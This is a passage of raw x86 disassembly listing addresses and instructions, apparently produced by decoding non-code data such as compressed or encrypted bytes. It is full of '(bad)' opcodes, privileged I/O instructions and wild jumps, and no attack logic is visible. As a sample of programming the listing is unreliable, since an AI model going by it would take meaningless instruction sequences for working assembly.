  413289:	mul    ah
  41328b:	mov    al,0x66
  41328d:	jns    0x413271
  41328f:	das    
  413290:	sub    edx,esi
  413292:	and    BYTE PTR [edx],ah
  413294:	test   DWORD PTR [eax+eiz*1],0x11bf6d59
  41329b:	cmp    DWORD PTR [edi-0x35],edi
  41329e:	xchg   esi,eax
  41329f:	cmp    al,0x87
  4132a1:	or     al,0xc3
  4132a3:	mov    eax,0x2ecadd8b
  4132a8:	or     eax,DWORD PTR [ebx+0x1]
  4132ab:	mov    ecx,0xbcd9d674
  4132b0:	cmc    
  4132b1:	cmp    BYTE PTR [esi+ebx*2+0xf],bl
  4132b5:	retf   0x5287
  4132b8:	dec    edx
  4132b9:	ja     0x4132a6
  4132bb:	push   ecx
  4132bc:	mov    esp,0x403ebf98
  4132c1:	pusha  
  4132c2:	std    
  4132c3:	ds mov esp,0xd8eca3c4
  4132c9:	inc    esp
  4132ca:	add    ch,dl
  4132cc:	sbb    al,BYTE PTR [ebx+0x4adc64ef]
  4132d2:	ins    DWORD PTR es:[edi],dx
  4132d3:	mov    ecx,0xc7c06cd6
  4132d8:	push   esp
  4132d9:	push   cs
  4132da:	fwait
  4132db:	and    esi,0x1f2a7bab
  4132e1:	das    
  4132e2:	xor    eax,0xd9e76d8a
  4132e7:	fisubr WORD PTR [ebp+0x65722605]
  4132ed:	mov    ch,0x9c
  4132ef:	push   0xfffffff5
  4132f1:	sbb    ecx,esp
  4132f3:	sti    
  4132f4:	inc    ebp
  4132f5:	pop    es
  4132f6:	jnp    0x413328
  4132f8:	lds    esi,FWORD PTR [eax-0x7fae7762]
  4132fe:	aaa    
  4132ff:	jbe    0x4132a8
  413301:	push   cs
  413302:	ins    DWORD PTR es:[edi],dx
  413303:	outs   dx,DWORD PTR ds:[esi]
  413304:	pop    es
  413305:	dec    ebp
  413306:	xor    ecx,DWORD PTR [edi+0x36]
  413309:	enter  0x9ce4,0x98
  41330d:	push   cs
  41330e:	adc    dl,BYTE PTR ds:0x36363e87
  413314:	xlat   BYTE PTR ds:[ebx]
  413315:	and    BYTE PTR [ecx],bh
  413317:	shl    DWORD PTR [ebx],cl
  413319:	xor    eax,0x6d0eb9c3
  41331e:	fistp  WORD PTR [ebp-0x4b]
  413321:	ret    0x5be6
  413324:	jo     0x4132d1
  413326:	aaa    
  413327:	ret    0x2487
  41332a:	inc    edx
  41332b:	mov    edx,0xf59ac4c8
  413330:	fbstp  TBYTE PTR [ecx]
  413332:	jae    0x413332
  413334:	inc    eax
  413335:	mov    edi,0x63504124
  41333a:	adc    cl,BYTE PTR [eax-0x159e96bf]
  413340:	pop    ebx
  413341:	pusha  
  413342:	cmp    ch,cl
  413344:	or     DWORD PTR [edx-0x71ae5f3d],ecx
  41334a:	retf   
  41334b:	dec    ecx
  41334c:	outs   dx,DWORD PTR ds:[esi]
  41334d:	cwde   
  41334e:	loopne 0x4133c0
  413350:	in     eax,0x29
  413352:	inc    edx
  413353:	fisttp DWORD PTR [ebp-0x78eec410]
  413359:	loope  0x413384
  41335b:	es cdq 
  41335d:	sub    eax,0x792cf965
  413362:	cmp    BYTE PTR ds:0x6a86e7b0,ah
  413368:	inc    edi
  413369:	outs   dx,BYTE PTR ds:[esi]
  41336a:	ret    
  41336b:	sbb    eax,0x2c27ebdf
  413370:	cmp    al,0x34
  413372:	jecxz  0x413306
  413374:	icebp  
  413375:	fist   WORD PTR [eax-0x16]
  413378:	dec    ecx
  413379:	test   DWORD PTR [edi+0x46],0xf521f06
  413380:	mov    ecx,0x672e01e9
  413385:	out    dx,eax
  413386:	std    
  413387:	mov    esp,DWORD PTR [edx]
  413389:	aam    0x30
  41338b:	div    bl
  41338d:	int    0x19
  41338f:	dec    ebx
  413390:	mov    edx,0x85be0639
  413395:	and    eax,0x506769a4
  41339b:	jne    0x4133a4
  41339d:	xor    DWORD PTR [eax-0x7e],0xb89515a5
  4133a4:	adc    ch,BYTE PTR [edi-0x621cd9f5]
  4133aa:	fimul  WORD PTR [ebp+0x2fddd174]
  4133b0:	adc    DWORD PTR [bp+di+0xc],edi
  4133b4:	in     eax,0xfb
  4133b6:	lock or eax,0x3373470
  4133bc:	push   es
  4133bd:	(bad)  
  4133be:	fst    QWORD PTR [ecx]
  4133c0:	sgdtd  [ebp+0x1d]
  4133c4:	pop    esp
  4133c5:	mov    eax,ds:0xc85ba3ef
  4133ca:	and    al,0xf3
  4133cc:	xchg   ebx,eax
  4133cd:	(bad)
  4133d0:	mov    edx,0x5b0f44dc
  4133d5:	pop    eax
  4133d6:	stc    
  4133d7:	sti    
  4133d8:	mov    ecx,0xcadf047c
  4133dd:	add    DWORD PTR [edi+0xed509e1],0x8bb41257
  4133e7:	pop    esi
  4133e8:	in     eax,dx
  4133e9:	adc    DWORD PTR [edi+0x18],eax
  4133ec:	pop    ecx
  4133ed:	xor    ebx,DWORD PTR [ebx]
  4133ef:	mov    edx,0x2388ed97
  4133f4:	inc    ebp
  4133f5:	(bad)  
  4133f6:	popf   
  4133f7:	jnp    0x413420
  4133f9:	int    0xee
  4133fb:	sub    BYTE PTR [edx-0x764a556b],dh
  413401:	bound  edx,QWORD PTR [eax]
  413403:	and    cl,0xd0
  413406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413407:	lds    ebp,FWORD PTR [ebx+ebx*2-0x1e]
  41340b:	add    edi,esi
  41340d:	mov    ch,dh
  41340f:	shl    edx,cl
  413411:	pop    esp
  413412:	call   0xfcbb:0x6961f2dd
  413419:	dec    ebx
  41341a:	sub    dl,cl
  41341c:	pop    ebx
  41341d:	ins    BYTE PTR es:[edi],dx
  41341e:	ja     0x41341b
  413420:	stc    
  413421:	mov    ebp,0x3299a28b
  413426:	fst    QWORD PTR [esi]
  413428:	and    DWORD PTR [ecx-0x49],0x51
  41342c:	and    ch,BYTE PTR es:[edx+0x151d10bd]
  413433:	loope  0x413429
  413435:	dec    ebx
  413436:	and    BYTE PTR [esi-0x63],al
  413439:	lahf   
  41343a:	loop   0x4133e7
  41343c:	aam    0x25
  41343e:	loop   0x41341a
  413440:	stc    
  413441:	(bad)  
  413442:	outs   dx,DWORD PTR ds:[esi]
  413443:	in     al,dx
  413444:	mov    WORD PTR [eax+edx*4],?
  413447:	neg    DWORD PTR [ebp+0x51e1a28f]
  41344d:	inc    ecx
  41344e:	xchg   edx,eax
  41344f:	xchg   edx,eax
  413450:	dec    edx
  413451:	and    esi,DWORD PTR fs:[ecx]
  413454:	xchg   ch,dl
  413456:	ins    BYTE PTR es:[edi],dx
  413457:	adc    eax,0x928c0b64
  41345c:	xor    al,0x2f
  41345e:	cli    
  41345f:	push   ebx
  413460:	je     0x41341a
  413462:	(bad)  
  413463:	xor    ah,cl
  413465:	push   0xb9dca18c
  41346a:	retf   
  41346b:	xchg   ebp,eax
  41346c:	sub    al,0xf5
  41346e:	mov    bh,0xfd
  413470:	adc    al,0xc
  413472:	adc    eax,0x5f6c3329
  413477:	clc    
  413478:	das    
  413479:	(bad)  
  41347a:	scas   al,BYTE PTR es:[edi]
  41347b:	pop    ss
  41347c:	ins    DWORD PTR es:[edi],dx
  41347d:	call   0xfa93:0x4d0f545b
  413484:	mov    esp,0xcbe87e35
  413489:	mov    dh,0xea
  41348b:	into   
  41348c:	xchg   esi,eax
  41348d:	adc    al,0xa1
  41348f:	mov    esi,0x5341df6d
  413494:	mov    cl,0xa8
  413496:	rol    DWORD PTR [esi],1
  413498:	(bad)  
  413499:	call   0xaff5:0xa45ac5a8
  4134a0:	shr    BYTE PTR [ebp+0x35],cl
  4134a3:	mov    esp,DWORD PTR [ebx-0x57]
  4134a6:	(bad)  
  4134a7:	aad    0xaa
  4134a9:	cmp    al,BYTE PTR [edi+0x4c]
  4134ac:	mov    edi,DWORD PTR [edx+0x4894e169]
  4134b2:	cmp    eax,0xf643d6f
  4134b7:	enter  0xad92,0xa1
  4134bb:	inc    ecx
  4134bc:	dec    eax
  4134bd:	or     DWORD PTR [edx-0x80],edx
  4134c0:	mov    bh,BYTE PTR [edi-0x4cfaa08c]
  4134c6:	mov    dh,0xce
  4134c8:	fisttp WORD PTR [edi]
  4134ca:	sub    eax,0x25868b28
  4134cf:	je     0x41349d
  4134d1:	hlt    
  4134d2:	in     eax,0xd3
  4134d4:	pop    ecx
  4134d5:	popa   
  4134d6:	jns    0x4134fb
  4134d8:	sbb    dh,BYTE PTR [edi-0x2b]
  4134db:	stc    
  4134dc:	and    eax,0x59a6d8d0
  4134e1:	mov    esi,0xecbe5e3a
  4134e6:	adc    esp,esi
  4134e8:	sub    al,0x6d
  4134ea:	stc    
  4134eb:	inc    ebx
  4134ec:	adc    ecx,esi
  4134ee:	push   ebx
  4134ef:	cmp    DWORD PTR [eax],esi
  4134f1:	aad    0x6c
  4134f3:	jmp    0x90f8fc23
  4134f8:	and    bl,BYTE PTR [ecx]
  4134fa:	xchg   al,al
  4134fc:	(bad)  
  4134fe:	aam    0xfb
  413500:	popf   
  413501:	fst    QWORD PTR [ebp+0x23]
  413504:	sub    bh,al
  413506:	(bad)  
  413507:	icebp  
  413508:	xchg   edi,eax
  413509:	sbb    dh,BYTE PTR [edx-0x16]
  41350c:	mov    esp,0x4572a5f9
  413511:	xchg   ebp,eax
  413512:	fild   QWORD PTR [ebp-0xc]
  413515:	jae    0x413518
  413517:	add    eax,0xdcdec36f
  41351c:	dec    eax
  41351d:	sub    eax,0xc5391d81
  413522:	in     al,dx
  413523:	mov    ds:0xb2d0ceba,eax
  413528:	pusha  
  413529:	les    eax,FWORD PTR [ecx-0x28504321]
  41352f:	push   edi
  413530:	jno    0x413569
  413532:	lods   al,BYTE PTR ds:[esi]
  413533:	ins    DWORD PTR es:[edi],dx
  413534:	dec    ecx
  413535:	sahf   
  413536:	dec    esp
  413537:	and    DWORD PTR [edx+0x4c6171bf],ebp
  41353d:	add    al,0xba
  41353f:	xor    esp,esp
  413541:	dec    esp
  413542:	fcomi  st,st(4)
  413544:	pop    ebx
  413545:	das    
  413546:	mov    WORD PTR [eax-0x6ea09b8b],cs
  41354c:	cmp    esp,DWORD PTR [edi+edx*4-0x45]
  413550:	pop    edi
  413551:	rcl    BYTE PTR [edi-0x4b],cl
  413554:	pop    ebp
  413555:	or     al,0xb2
  413557:	pop    ds
  413558:	push   ds
  413559:	mov    edx,DWORD PTR [edi+0x668c7de8]
  41355f:	jmp    0x413557
  413561:	ins    DWORD PTR es:[edi],dx
  413562:	add    DWORD PTR [esi+esi*4],0xd9dc7c3a
  413569:	mov    esp,0x45ecb64f
  41356e:	or     al,0x8
  413570:	enter  0x3a2,0x16
  413574:	into   
  413575:	js     0x4135b1
  413577:	call   0xdc678d44
  41357c:	adc    DWORD PTR [edx],eax
  41357e:	xor    cl,BYTE PTR [eax]
  413580:	mov    ah,0x7f
  413582:	adc    ah,BYTE PTR [ecx+ebx*4-0x6e]
  413586:	mov    ds:0x5ba7b6f7,eax
  41358b:	fstp   TBYTE PTR [edx+0x34281987]
  413591:	not    esp
  413593:	cdq    
  413594:	call   0x3ea0146
  413599:	xchg   ebx,eax
  41359a:	mov    edx,0xf518206d
  41359f:	xor    cl,BYTE PTR [eax]
  4135a1:	pop    ebp
  4135a2:	je     0xb376e433
  4135a8:	out    0x77,al
  4135aa:	push   esp
  4135ab:	add    eax,0xfbab86cd
  4135b0:	neg    ecx
  4135b2:	das    
  4135b3:	and    edx,DWORD PTR [ecx+ecx*4]
  4135b6:	jns    0x413612
  4135b8:	push   edx
  4135b9:	xchg   DWORD PTR [ebp+0x30],esi
  4135bc:	ret    0x230d
  4135bf:	bound  ebp,QWORD PTR [eax]
  4135c1:	pop    edx
  4135c2:	gs xor eax,0x7d7517e9
  4135c8:	stos   DWORD PTR es:[edi],eax
  4135c9:	sar    ecx,0x55
  4135cc:	nop
  4135cd:	int    0x61
  4135cf:	sub    esp,0x3
  4135d2:	push   edi
  4135d3:	push   ds
  4135d4:	aad    0xa6
  4135d6:	or     DWORD PTR [edx+edi*2-0x1c46abb0],eax
  4135dd:	or     eax,0x7b016376
  4135e2:	jl     0x4135d0
  4135e4:	test   DWORD PTR [ecx-0x7414eb8f],0xbc6d7489
  4135ee:	jl     0x4135d7
  4135f0:	rdmsr  
  4135f2:	mov    al,BYTE PTR [esi+0xafc2415]
  4135f8:	xchg   esp,eax
  4135f9:	arpl   sp,sp
  4135fb:	test   eax,0x9b50e74c
  413600:	lds    esp,FWORD PTR [edx]
  413602:	test   al,0xf0
  413604:	popa   
  413605:	pushf  
  413606:	adc    eax,0xd59a3bc4
  41360b:	js     0x4135d5
  41360d:	push   ss
  41360e:	lea    esp,[edx-0x178b1e96]
  413614:	stos   BYTE PTR es:[edi],al
  413615:	retf   0xc187
  413618:	push   edi
  413619:	pop    ds
  41361a:	in     eax,dx
  41361b:	sbb    DWORD PTR [ebx+ebp*2-0x47],esi
  41361f:	pop    edx
  413620:	sbb    al,0xd5
  413622:	je     0x4135e9
  413624:	inc    esp
  413625:	daa    
  413626:	retf   
  413627:	jecxz  0x4135e6
  413629:	out    dx,al
  41362a:	mov    ebx,0xa561fe5f
  41362f:	xchg   edx,eax
  413630:	pop    eax
  413631:	mov    ds,eax
  413633:	fld    QWORD PTR [edx-0x56]
  413636:	xlat   BYTE PTR ds:[ebx]
  413637:	and    bh,bh
  413639:	and    dh,BYTE PTR [ecx]
  41363b:	and    DWORD PTR [di+0x5b],0x6ec52dc4
  413643:	out    dx,eax
  413644:	and    al,0x84
  413646:	dec    edi
  413647:	in     eax,dx
  413648:	or     ecx,DWORD PTR [ebx*8-0x422575fc]
  41364f:	jbe    0x413654
  413651:	xchg   ebx,esp
  413653:	push   eax
  413654:	test   DWORD PTR [edx-0x5c091de6],ebx
  41365a:	jb     0x413678
  41365c:	cli    
  41365d:	shl    DWORD PTR [ebx-0x49],cl
  413660:	sbb    eax,0x3ab77bf8
  413665:	push   eax
  413666:	outs   dx,BYTE PTR ds:[esi]
  413667:	pusha  
  413668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413669:	jo     0x413669
  41366b:	pop    ss
  41366c:	jge    0x413689
  41366e:	or     edx,ebx
  413670:	inc    ebx
  413671:	jecxz  0x4136bd
  413673:	call   0x4fb3:0x4df48367
  41367a:	sbb    al,0xb4
  41367c:	cli    
  41367d:	pushf  
  41367e:	inc    esp
  41367f:	xchg   ecx,eax
  413680:	sub    BYTE PTR [ebx+0x3ff4e858],cl
  413686:	out    dx,al
  413687:	sub    al,0xbc
  413689:	pop    ss
  41368a:	cli    
  41368b:	add    eax,0xb983f045
  413690:	retf   0xb28d
  413693:	add    bh,al
  413695:	fimul  DWORD PTR [ebx-0x35]
  413698:	sub    ch,BYTE PTR [esi]
  41369a:	push   0x469fbe
  41369f:	mov    es,WORD PTR [edi-0x1c798de4]
  4136a5:	jnp    0x413658
  4136a7:	fs in  eax,0x31
  4136aa:	pop    edi
  4136ab:	arpl   dx,si
  4136ad:	outs   dx,DWORD PTR ds:[esi]
  4136ae:	inc    esp
  4136af:	jbe    0x41363a
  4136b1:	mov    al,ds:0x7190b837
  4136b6:	cmp    cl,bl
  4136b8:	mov    dh,0xd8
  4136ba:	cmp    BYTE PTR [edi+0x69a4aa1b],cl
  4136c0:	adc    edi,edx
  4136c2:	fwait
  4136c3:	cwde   
  4136c4:	shl    BYTE PTR [edi],0xe9
  4136c7:	push   ecx
  4136c8:	push   ss
  4136c9:	mov    eax,ds:0x963e993
  4136ce:	and    bh,BYTE PTR [ebp+0x194ee8a9]
  4136d4:	ja     0x41372a
  4136d6:	mov    DWORD PTR [eax],edi
  4136d8:	ins    BYTE PTR es:[edi],dx
  4136d9:	mov    ecx,0x17ff620c
  4136de:	xor    ebx,edi
  4136e0:	xchg   bh,ah
  4136e2:	jno    0x4136ba
  4136e4:	xor    BYTE PTR [esi+0x67],0x4f
  4136e8:	mov    BYTE PTR [ebx+edx*4],dh
  4136eb:	es out 0xbc,al
  4136ee:	pop    ecx
  4136ef:	push   ebx
  4136f0:	aaa    
  4136f1:	push   ebp
  4136f2:	mov    cl,0x58
  4136f4:	mov    ebx,esi
  4136f6:	loopne 0x4136af
  4136f8:	imul   BYTE PTR [edi+esi*4]
  4136fb:	cwde   
  4136fc:	mov    cl,BYTE PTR [ecx+0x1dc5a381]
  413702:	popa   
  413703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413704:	inc    eax
  413705:	sahf   
  413706:	jns    0x4136bc
  413708:	fsub   QWORD PTR [eax-0x4bea0149]
  41370e:	popa   
  41370f:	stos   DWORD PTR es:[edi],eax
  413710:	aam    0xa7
  413712:	push   esi
  413713:	mov    bl,0x78
  413715:	add    al,0x38
  413717:	test   al,0x24
  413719:	imul   bh
  41371b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41371c:	imul   DWORD PTR [ebp+0x39]
  41371f:	call   0x283717e9
  413724:	or     BYTE PTR [edi-0x9],dh
  413727:	sub    ebp,DWORD PTR [ecx-0x41668b69]
  41372d:	rcr    BYTE PTR [ebp-0x6f],1
  413730:	mov    ebx,0xc03f5b14
  413735:	pop    edx
  413736:	lods   al,BYTE PTR ds:[esi]
  413737:	sub    DWORD PTR [ecx+0x64d18d89],edx
  41373d:	sar    BYTE PTR [edi+0x22],0x76
  413741:	sbb    cl,BYTE PTR [ebp-0x7778b11d]
  413747:	repnz or al,0x30
  41374a:	(bad)  [edx+0x9]
  41374d:	in     al,0x84
  41374f:	add    esi,DWORD PTR [ecx+0x44]
  413752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413753:	test   DWORD PTR [edx],eax
  413755:	pop    esi
  413756:	add    esp,esp
  413758:	fistp  QWORD PTR [ecx]
  41375a:	push   ebx
  41375b:	push   0x33dffdab
  413760:	sub    al,0x28
  413762:	outs   dx,DWORD PTR ds:[esi]
  413763:	sbb    DWORD PTR [ebx-0x46],0xffffffc2
  413767:	fmul   QWORD PTR [ecx]
  413769:	jno    0x4136f9
  41376b:	mov    bh,0xe7
  41376d:	ret    
  41376e:	icebp  
  41376f:	fcomp  DWORD PTR [eax+0x2ba25896]
  413775:	daa    
  413776:	jmp    0x413747
  413778:	mov    ah,BYTE PTR gs:[ecx-0x70682b4d]
  41377f:	cmp    ah,BYTE PTR [edx]
  413781:	daa    
  413782:	and    eax,0x2dd9ba60
  413787:	aam    0x27
  413789:	and    dh,BYTE PTR [esi]
  41378b:	call   0x7dec:0x9ff0eb38
  413792:	into   
  413793:	add    edi,edi
  413795:	cmp    ch,ah
  413797:	fcom   DWORD PTR [ebx-0x34]
  41379a:	cmp    cl,dl
  41379c:	inc    ebx
  41379d:	push   es
  41379e:	js     0x4137fb
  4137a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137a1:	mov    WORD PTR [esi*4-0x6d23824b],gs
  4137a8:	aam    0x5d
  4137aa:	xchg   edi,eax
  4137ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ac:	shl    BYTE PTR ds:0x15f1429e,1
  4137b2:	mov    bh,0xeb
  4137b4:	ds push ebp
  4137b6:	aam    0x4
  4137b8:	dec    esi
  4137b9:	jmp    0x6ee819e0
  4137be:	adc    ebx,DWORD PTR [ebx+0x6d]
  4137c1:	and    al,0xa3
  4137c3:	sub    eax,0x7060de12
  4137c8:	outs   dx,DWORD PTR ds:[esi]
  4137c9:	es loopne 0x413751
  4137cc:	inc    ecx
  4137cd:	xor    dl,BYTE PTR [ebx]
  4137cf:	jnp    0x41376b
  4137d1:	mov    ds:0x37d542d0,eax
  4137d6:	sub    DWORD PTR [ebx-0x75edc0ab],esi
  4137dc:	xchg   DWORD PTR [esi],esp
  4137de:	dec    ecx
  4137df:	or     esi,DWORD PTR [ebp-0x76]
  4137e2:	stos   DWORD PTR es:[edi],eax
  4137e3:	loopne 0x41380e
  4137e5:	(bad)  
  4137e6:	cmp    cl,BYTE PTR [eax]
  4137e8:	jbe    0x413833
  4137ea:	xor    BYTE PTR [ebx-0x70a9f689],ch
  4137f0:	inc    eax
  4137f1:	push   ebx
  4137f2:	xchg   esp,eax
  4137f3:	(bad)
  4137f6:	jge    0x413792
  4137f8:	dec    esp
  4137f9:	clc    
  4137fa:	enter  0x4f3f,0xb7
  4137fe:	es push ss
  413800:	jle    0x41383d
  413802:	dec    esp
  413803:	dec    ebp
  413804:	out    dx,eax
  413805:	shr    BYTE PTR [esi+0x36],0xdd
  413809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41380a:	sbb    eax,0xed63985e
  41380f:	push   ecx
  413810:	(bad)  
  413811:	xchg   esp,eax
  413812:	repz arpl WORD PTR [ebp-0x8],di
  413816:	shl    DWORD PTR [edi+eax*2+0x76],0xbe
  41381b:	mov    esi,0xc370e1b5
  413820:	jle    0x41385b
  413822:	shl    DWORD PTR [esi-0x52],1
  413825:	pop    edx
  413826:	fwait
  413827:	jnp    0x4138a7
  413829:	fsub   st,st(6)
  41382b:	in     eax,0x78
  41382d:	ins    DWORD PTR es:[edi],dx
  41382e:	aaa    
  41382f:	xor    ch,BYTE PTR [esi+0x7afd6f5f]
  413835:	add    DWORD PTR gs:[esi+ecx*4-0x20ca91c1],eax
  41383d:	pop    ebp
  41383e:	hlt    
  41383f:	retf   
  413840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413841:	ins    BYTE PTR es:[edi],dx
  413842:	dec    edi
  413843:	jo     0x4137d5
  413845:	arpl   WORD PTR [ebp-0x72ad9fa1],sp
  41384b:	ins    BYTE PTR es:[edi],dx
  41384c:	sbb    eax,0x662a6912
  413851:	jmp    0x413861
  413853:	outs   dx,BYTE PTR ds:[esi]
  413854:	imul   ecx,DWORD PTR [edi-0x4f],0x44d63766
  41385b:	or     BYTE PTR [esi],0x28
  41385e:	aas    
  41385f:	push   0x635de021
  413864:	bound  eax,QWORD PTR [ebx-0x77]
  413867:	loopne 0x413864
  413869:	jl     0x413868
  41386b:	dec    esi
  41386c:	jp     0x413838
  41386e:	push   cs
  41386f:	ret    
  413870:	mov    dl,BYTE PTR [edx]
  413872:	lods   al,BYTE PTR ds:[esi]
  413873:	cmp    edx,ebx
  413875:	stos   DWORD PTR es:[edi],eax
  413876:	and    BYTE PTR [ecx+0x5],al
  413879:	and    al,0xa9
  41387b:	adc    eax,0xbd8fda7c
  413880:	addr16 and eax,0x33bb0614
  413886:	pop    esi
  413887:	xlat   BYTE PTR ds:[ebx]
  413888:	cld    
  413889:	test   DWORD PTR [edi-0x5c],0xb13364e0
  413890:	inc    eax
  413891:	inc    eax
  413892:	outs   dx,DWORD PTR ds:[esi]
  413893:	add    al,0xda
  413895:	sbb    eax,0xd98b4bc8
  41389a:	mov    bl,0x78
  41389c:	(bad)  
  41389d:	xor    BYTE PTR [esi],dh
  41389f:	sbb    BYTE PTR [eax],0x62
  4138a2:	jne    0x41384d
  4138a4:	pop    ebx
  4138a5:	rcl    BYTE PTR [esp+esi*2],1
  4138a8:	iret   
  4138a9:	mov    ecx,0x154c3b34
  4138ae:	ret    0x3e96
  4138b1:	jae    0x41389c
  4138b3:	pop    eax
  4138b4:	or     esi,eax
  4138b6:	aaa    
  4138b7:	mov    DWORD PTR ds:0xca87cfa7,0x59f8e92e
  4138c1:	icebp  
  4138c2:	sbb    BYTE PTR [ebp+0x13dde4a4],bl
  4138c8:	cmc    
  4138c9:	sub    BYTE PTR [edi+0x7a6e829],ah
  4138cf:	lea    esi,[edx]
  4138d1:	std    
  4138d2:	je     0x413935
  4138d4:	popf   
  4138d5:	sti    
  4138d6:	jmp    0x41387c
  4138d8:	sbb    BYTE PTR [eax-0x185d73f9],dh
  4138de:	call   0x7de7d076
  4138e3:	jle    0x41388b
  4138e5:	mov    al,ds:0xe973f8a0
  4138ea:	lods   eax,DWORD PTR ds:[esi]
  4138eb:	ret    0xdac1
  4138ee:	sahf   
  4138ef:	xchg   ecx,eax
  4138f0:	adc    BYTE PTR [esi],al
  4138f2:	das    
  4138f3:	mov    dl,0x7d
  4138f5:	and    ah,BYTE PTR [ebx]
  4138f7:	ret    
  4138f8:	fstp   DWORD PTR [edi+0x5283f8c]
  4138fe:	dec    edx
  413900:	stos   DWORD PTR es:[edi],eax
  413901:	adc    esp,eax
  413903:	ror    DWORD PTR [ebp-0x655b8895],1
  413909:	imul   ebp,DWORD PTR ds:0x1d912b09,0x52ca33f9
  413913:	jg     0x4138db
  413915:	adc    eax,0x4c717b6
  41391a:	fwait
  41391b:	sub    cl,bh
  41391d:	aas    
  41391e:	in     al,0xdc
  413920:	dec    esp
  413921:	fisubr WORD PTR [edx]
  413923:	xor    al,0x73
  413925:	pop    eax
  413926:	jne    0x41392e
  413928:	jmp    0x278b834f
  41392d:	or     al,0xd1
  41392f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413930:	sub    DWORD PTR [ebp-0x728e8ea1],eax
  413936:	rol    ecx,cl
  413938:	jmp    0x413987
  41393a:	jae    0x4139ba
  41393c:	xor    DWORD PTR [eax-0x33],eax
  41393f:	mov    esi,0x8e86da9a
  413944:	inc    eax
  413945:	pop    edi
  413946:	fs (bad) 
  413948:	jmp    FWORD PTR [edx+0xa]
  41394b:	push   esp
  41394c:	xchg   BYTE PTR [ecx],ah
  41394e:	sbb    DWORD PTR [edx+ebx*8-0x3e],edi
  413952:	out    0xf7,al
  413954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413955:	ret    
  413956:	pop    ecx
  413957:	push   ss
  413958:	icebp  
  413959:	cs xor edx,ebp
  41395c:	pop    ds
  41395d:	fcomi  st,st(5)
  41395f:	mov    bh,0xc7
  413961:	sti    
  413962:	adc    DWORD PTR [ebp-0x73],0x41a34369
  413969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41396a:	clc    
  41396b:	and    dl,BYTE PTR [ebx-0x7a50230e]
  413971:	xchg   esp,eax
  413972:	shl    BYTE PTR [ebp+edi*1-0x26],0x86
  413977:	push   es
  413978:	jle    0x4139af
  41397a:	lds    edi,FWORD PTR [edi+0x7b]
  41397d:	mov    bl,0xcd
  41397f:	mov    dl,BYTE PTR [edi]
  413981:	xor    eax,0xc492713d
  413986:	or     al,0x2b
  413988:	lock adc eax,0xb4fd3505
  41398e:	(bad)  
  41398f:	cmp    DWORD PTR [ebx+0x2b30f58d],eax
  413995:	loop   0x413a02
  413997:	xchg   esp,eax
  413998:	lahf   
  413999:	(bad)  
  41399a:	in     al,dx
  41399b:	and    al,0x0
  41399d:	aas    
  41399e:	mov    al,ds:0x287bb7c2
  4139a3:	clc    
  4139a4:	rcl    DWORD PTR [ebx+0x11],1
  4139a7:	gs mov cl,0xdc
  4139aa:	mov    al,ds:0x28ea5c89
  4139af:	sub    ah,cl
  4139b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b2:	imul   ebx,ebx,0xffffffc9
  4139b5:	xor    al,ah
  4139b7:	iret   
  4139b8:	call   0xe6a0ec89
  4139bd:	and    eax,0xfc47a616
  4139c2:	pop    ebp
  4139c3:	sub    esi,DWORD PTR [ecx-0x2a]
  4139c6:	fs scas eax,DWORD PTR es:[edi]
  4139c8:	cmp    eax,0xbcecfca4
  4139cd:	stos   BYTE PTR es:[edi],al
  4139ce:	popf   
  4139cf:	pop    ebx
  4139d0:	inc    ebx
  4139d1:	sub    BYTE PTR [ecx-0x1b36b07b],dl
  4139d7:	sahf   
  4139d8:	test   eax,0x823a4f90
  4139dd:	mov    ecx,0x3e82f3e
  4139e2:	inc    ecx
  4139e3:	(bad)  
  4139e4:	std    
  4139e5:	arpl   WORD PTR [ebx+0x61],cx
  4139e8:	loope  0x41398f
  4139ea:	jmp    0x883878c2
  4139ef:	stos   BYTE PTR es:[edi],al
  4139f0:	fwait
  4139f1:	xchg   edx,eax
  4139f2:	and    esp,esp
  4139f4:	pop    ss
  4139f5:	push   cs
  4139f6:	and    BYTE PTR [ecx],0x57
  4139f9:	fwait
  4139fa:	mov    dh,0x91
  4139fc:	popf   
  4139fd:	jbe    0x413a0a
  4139ff:	or     dl,BYTE PTR [ebx-0x69]
  413a02:	pop    edi
  413a03:	or     al,0x5c
  413a05:	(bad)  
  413a06:	retf   0xb2c6
  413a09:	outs   dx,DWORD PTR ds:[esi]
  413a0a:	jns    0x413a46
  413a0c:	imul   eax,esi,0xa
  413a0f:	sbb    DWORD PTR [esi+0x27],edx
  413a12:	xor    DWORD PTR [edx],ebx
  413a14:	fsubr  DWORD PTR [ecx+0x52c2aac1]
  413a1a:	mov    al,ds:0xa1eed81a
  413a1f:	daa    
  413a20:	fcompp 
  413a22:	out    dx,al
  413a23:	pop    esi
  413a24:	dec    esp
  413a25:	sbb    ah,ch
  413a27:	js     0x4139ea
  413a29:	mov    edi,DWORD PTR [edi+0x54]
  413a2c:	add    DWORD PTR [ecx+0xd],ebp
  413a2f:	pop    edx
  413a30:	inc    ebx
  413a31:	jp     0x413a3b
  413a33:	add    dl,bh
  413a35:	fld    TBYTE PTR [esi]
  413a37:	scas   eax,DWORD PTR es:[edi]
  413a38:	aaa    
  413a39:	dec    eax
  413a3a:	cli    
  413a3b:	repz loope 0x413a9f
  413a3e:	inc    ebp
  413a3f:	pop    eax
  413a40:	loope  0x413aa8
  413a42:	lock jbe 0x4139cf
  413a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a46:	jp     0x413a75
  413a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a49:	cmp    DWORD PTR [eax-0x35aafa6b],ebp
  413a4f:	and    BYTE PTR [ebx],0xd7
  413a52:	ror    cl,0xda
  413a55:	into   
  413a56:	mov    dh,BYTE PTR [eax-0x56f5c0df]
  413a5c:	ds inc ecx
  413a5e:	sbb    bl,ch
